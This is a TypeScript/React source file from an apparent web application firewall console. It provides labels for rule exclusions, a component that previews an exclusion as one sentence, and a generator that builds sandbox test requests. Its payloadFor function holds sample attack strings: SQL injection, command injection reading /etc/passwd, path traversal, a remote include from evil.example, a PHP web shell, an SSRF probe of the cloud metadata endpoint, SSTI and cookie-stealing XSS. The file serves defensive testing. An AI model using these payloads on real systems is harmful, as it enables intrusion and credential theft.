"use client";

import { Fragment, type ReactNode } from "react";
import { create } from "zustand";
import { Tooltip, TooltipContent, TooltipTrigger } from "@/components/ui/tooltip";
import { RuleIdPill, groupName, groupOfRule } from "@/components/firewall/firewall-kit";
import type { ExclusionPathMatch, FirewallExclusionInput, FirewallRuleInfo, FirewallSandboxInput } from "@/lib/api/firewall";
import { cn } from "@/lib/utils";

/**
 * WAF 例外的说法、预览句与测试台样本。例外页签与测试台共用。
 */

export const PATH_MATCH_META: Record<ExclusionPathMatch, { label: string; hint: string }> = {
  prefix: { label: "前缀", hint: "路径以此开头即匹配，最常用" },
  exact: { label: "精确", hint: "路径完全相同才匹配，不含查询串" },
  regex: { label: "正则", hint: "RE2 正则匹配路径，记得写 ^ 与 $" }
};

export const EXCLUSION_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE"] as const;

export const TAG_LABEL: Record<string, string> = {
  "attack-sqli": "SQL 注入",
  "attack-xss": "跨站脚本",
  "attack-rce": "远程命令执行",
  "attack-lfi": "本地文件包含",
  "attack-rfi": "远程文件包含",
  "attack-protocol": "协议攻击",
  "attack-injection-php": "PHP 注入",
  "attack-injection-generic": "通用注入",
  "attack-ssrf": "SSRF",
  "attack-ssti": "模板注入"
};

export const TAG_SUGGESTIONS = Object.keys(TAG_LABEL);

export const TARGET_EXAMPLES: { value: string; label: string }[] = [
  { value: "ARGS:json.content", label: "JSON 字段 content" },
  { value: "ARGS:/^json\\.items\\./", label: "JSON 数组 items 下所有字段" },
  { value: "REQUEST_HEADERS:User-Agent", label: "请求头 User-Agent" },
  { value: "REQUEST_COOKIES:session", label: "Cookie session" }
];

/** 例外是否只移除检查目标（推荐的、影响面更小的写法） */
export function isTargetScoped(input: Pick<FirewallExclusionInput, "targets">) {
  return (input.targets?.length ?? 0) > 0;
}

export function pathDisplay(match: ExclusionPathMatch, path: string) {
  if (!path) return "（未填路径）";
  if (match === "prefix") return `${path}*`;
  if (match === "regex") return `~ ${path}`;
  return path;
}

/* ── 规则编号胶囊（带组名与目录里的说明） ── */

export function RuleIdChip({ id, info, className, children }: { id: number; info?: FirewallRuleInfo; className?: string; children?: ReactNode }) {
  const group = groupName(info?.group ?? groupOfRule(id));
  return (
    <Tooltip>
      <TooltipTrigger asChild>
        <span className={cn("inline-flex max-w-full min-w-0 items-center gap-1 rounded-md border border-border bg-card py-px pr-1.5 pl-px", className)}>
          <RuleIdPill id={id} />
          <span className="min-w-0 truncate text-[11px] text-muted-foreground">{group}</span>
          {children}
        </span>
      </TooltipTrigger>
      <TooltipContent className="max-w-80">{info?.message || `#${id}（目录里没有这条规则）`}</TooltipContent>
    </Tooltip>
  );
}

/* ── 一句话预览 ── */

function Mono({ children }: { children: ReactNode }) {
  return <code className="rounded bg-muted px-1 font-mono text-[0.92em] break-all">{children}</code>;
}

function joinNodes(nodes: ReactNode[], sep = "、") {
  return nodes.map((node, index) => (
    <Fragment key={index}>
      {index > 0 ? sep : null}
      {node}
    </Fragment>
  ));
}

/** 「对 POST /api/... 的请求，不再用 #941100（跨站脚本）检查 ARGS:json.html」 */
export function ExclusionSentence({ input, className }: { input: FirewallExclusionInput; className?: string }) {
  const methods = input.methods?.length ? input.methods.join(" / ") : "任意方法";
  const ruleNodes = (input.ruleIds ?? []).map((id) => (
    <Fragment key={`r${id}`}>
      <Mono>#{id}</Mono>（{groupName(groupOfRule(id))}）
    </Fragment>
  ));
  const tagNodes = (input.tags ?? []).map((tag) => (
    <Fragment key={`t${tag}`}>
      标签 <Mono>{tag}</Mono>
      {TAG_LABEL[tag] ? `（${TAG_LABEL[tag]}）` : null}
    </Fragment>
  ));
  const removed = [...ruleNodes, ...tagNodes];
  const targets = input.targets ?? [];
  return (
    <p className={cn("text-xs leading-5", className)}>
      对 <Mono>{methods}</Mono> <Mono>{pathDisplay(input.pathMatch, input.path)}</Mono> 的请求，
      {removed.length === 0 ? (
        <span className="text-muted-foreground">还没有选要排除的规则或标签</span>
      ) : targets.length ? (
        <>
          不再用 {joinNodes(removed)} 检查 {joinNodes(targets.map((target) => <Mono key={target}>{target}</Mono>))}
        </>
      ) : (
        <>
          完全不执行 {joinNodes(removed)}
          <span className="text-amber-700 dark:text-amber-400">（整条移除）</span>
        </>
      )}
    </p>
  );
}

/* ── 测试台样本：按例外的路径、方法、规则组与检查目标拼一条「本该误报」的请求 ── */

function payloadFor(input: FirewallExclusionInput) {
  const groups = new Set((input.ruleIds ?? []).map(groupOfRule));
  const tags = new Set(input.tags ?? []);
  if (groups.has("942") || tags.has("attack-sqli")) return "1' OR '1'='1' --";
  if (groups.has("932") || tags.has("attack-rce")) return "; cat /etc/passwd";
  if (groups.has("930") || tags.has("attack-lfi")) return "../../../../etc/passwd";
  if (groups.has("931") || tags.has("attack-rfi")) return "http://evil.example/shell.txt?";
  if (groups.has("933") || tags.has("attack-injection-php")) return "<?php system($_GET['c']); ?>";
  if (tags.has("attack-ssrf")) return "http://169.254.169.254/latest/meta-data/";
  if (tags.has("attack-ssti")) return "{{7*7}}${7*7}";
  return "<script>alert(document.cookie)</script>";
}

function samplePath(match: ExclusionPathMatch, path: string) {
  let out = path.trim() || "/";
  if (match === "regex") {
    out = out
      .replace(/^\^/, "")
      .replace(/\$$/, "")
      .replace(/\[[^\]]*\][+*]?/g, "1")
      .replace(/\.\*|\.\+/g, "x")
      .replace(/\\(.)/g, "$1")
      .replace(/[()?+*|^$]/g, "");
  }
  return out.startsWith("/") ? out : `/${out}`;
}

/** ARGS:/^json\.items\./ → json.items.x */
function regexArgName(pattern: string) {
  return pattern
    .replace(/^\/|\/$/g, "")
    .replace(/^\^/, "")
    .replace(/\$$/, "")
    .replace(/\\(.)/g, "$1")
    .replace(/[()?+*|[\]]/g, "")
    .replace(/\.$/, ".x");
}

function setJsonPath(root: Record<string, unknown>, segments: string[], value: string) {
  let node = root;
  segments.forEach((segment, index) => {
    if (index === segments.length - 1) {
      node[segment] = value;
      return;
    }
    const next = node[segment];
    if (!next || typeof next !== "object") node[segment] = {};
    node = node[segment] as Record<string, unknown>;
  });
}

export function sandboxSampleFor(input: FirewallExclusionInput): FirewallSandboxInput {
  const payload = payloadFor(input);
  const targets = input.targets ?? [];
  const bodyish = targets.length === 0 || targets.some((target) => /^ARGS(_POST)?:/.test(target) || target.startsWith("REQUEST_BODY"));
  const method = input.methods?.[0] ?? (bodyish ? "POST" : "GET");
  const canBody = method !== "GET" && method !== "DELETE";
  const headers: Record<string, string> = {};
  const json: Record<string, unknown> = {};
  const query = new URLSearchParams();
  const cookies: string[] = [];

  for (const target of targets) {
    const [collection, ...rest] = target.split(":");
    const name = rest.join(":");
    if (!name) continue;
    if (collection === "REQUEST_HEADERS") headers[name] = payload;
    else if (collection === "REQUEST_COOKIES") cookies.push(`${name}=${encodeURIComponent(payload)}`);
    else if (collection === "ARGS" || collection === "ARGS_POST" || collection === "ARGS_GET") {
      const arg = name.startsWith("/") ? regexArgName(name) : name;
      if (arg.startsWith("json.") && canBody) setJsonPath(json, arg.slice(5).split(".").filter(Boolean), payload);
      else if (canBody && collection !== "ARGS_GET") json[arg.replace(/^json\./, "")] = payload;
      else query.set(arg.replace(/^json\./, ""), payload);
    }
  }
  if (targets.length === 0) {
    if (canBody) json.content = payload;
    else query.set("q", payload);
  }
  if (cookies.length) headers.Cookie = cookies.join("; ");

  const hasBody = canBody && Object.keys(json).length > 0;
  if (hasBody) headers["Content-Type"] = "application/json";
  const qs = query.toString();
  return {
    method,
    url: `${samplePath(input.pathMatch, input.path)}${qs ? `?${qs}` : ""}`,
    headers,
    body: hasBody ? JSON.stringify(json, null, 2) : "",
    ip: "203.0.113.10",
    transport: "plain"
  };
}

/* ── 编辑器 ⇄ 测试台：记住正在编辑哪条例外，从测试台回来时继续改同一条 ── */

type HandoffState = {
  editId: number | null;
  setEditId: (id: number | null) => void;
  takeEditId: () => number | null;
};

export const useExclusionHandoff = create<HandoffState>((set, get) => ({
  editId: null,
  setEditId: (id) => set({ editId: id }),
  takeEditId: () => {
    const id = get().editId;
    if (id !== null) set({ editId: null });
    return id;
  }
}));
